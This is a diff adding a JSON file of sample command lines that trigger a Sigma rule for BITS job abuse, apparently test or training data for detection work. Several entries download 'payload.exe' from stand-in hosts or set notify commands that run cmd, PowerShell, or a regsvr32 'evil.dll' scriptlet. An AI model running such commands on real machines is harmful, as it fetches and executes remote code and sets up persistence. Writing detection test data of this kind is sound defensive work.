@@ -1,0 +1,42 @@
+[
+  {
+    "output": "bitsadmin.exe /AddFile myjob payload.exe payload.exe",
+    "explanation": "This command adds a file to a BITS job. It matches the Sigma rule's detection criteria for '/Addfile' and file download patterns."
+  },
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob cmd.exe",
+    "explanation": "This command sets the notification command for a BITS job using 'cmd.exe', which is flagged by the Sigma rule's detection of specific executables in the command line."
+  },
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob powershell.exe",
+    "explanation": "This command sets the notification command using 'powershell.exe', which is also flagged by the Sigma rule for its potential abuse in persistence mechanisms."
+  },
+  {
+    "output": "bitsadmin.exe /AddFile myjob https://example.com/payload.exe C:\\Temp\\payload.exe",
+    "explanation": "This command adds a file from an HTTPS source to a BITS job, matching the Sigma rule's detection of HTTP/HTTPS/FTP sources in the command line."
+  },
+  {
+    "output": "bitsadmin.exe /AddFile myjob http://example.com/payload.exe C:\\Temp\\payload.exe",
+    "explanation": "This command adds a file from an HTTP source to a BITS job, matching the Sigma rule's detection of HTTP/HTTPS/FTP sources in the command line."
+  },
+  {
+    "output": "bitsadmin.exe /AddFile myjob ftp://example.com/payload.exe C:\\Temp\\payload.exe",
+    "explanation": "This command adds a file from an FTP source to a BITS job, matching the Sigma rule's detection of HTTP/HTTPS/FTP sources in the command line."
+  },
+  {
+    "output": "bitsadmin.exe /AddFile myjob ftps://example.com/payload.exe C:\\Temp\\payload.exe",
+    "explanation": "This command adds a file from an FTPS source to a BITS job, matching the Sigma rule's detection of HTTP/HTTPS/FTP sources in the command line."
+  },
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob %COMSPEC% /c echo Test",
+    "explanation": "This command uses '%COMSPEC%' to execute a command, which is flagged by the Sigma rule for its potential abuse in persistence mechanisms."
+  },
+  {
+    "output": "bitsadmin.exe /SetNotifyCmdLine myjob regsvr32.exe /s /n /u /i:evil.dll scrobj.dll",
+    "explanation": "This command uses 'regsvr32.exe' in the notification command line, which is flagged by the Sigma rule for its potential abuse in persistence mechanisms."
+  },
+  {
+    "output": "Start-BitsTransfer -Source http://example.com/payload.exe -Destination C:\\Temp\\payload.exe",
+    "explanation": "This PowerShell command initiates a file transfer using Start-BitsTransfer, which is similar to the behavior of bitsadmin.exe and is flagged by the Sigma rule for persistence via BITS."
+  }
+]
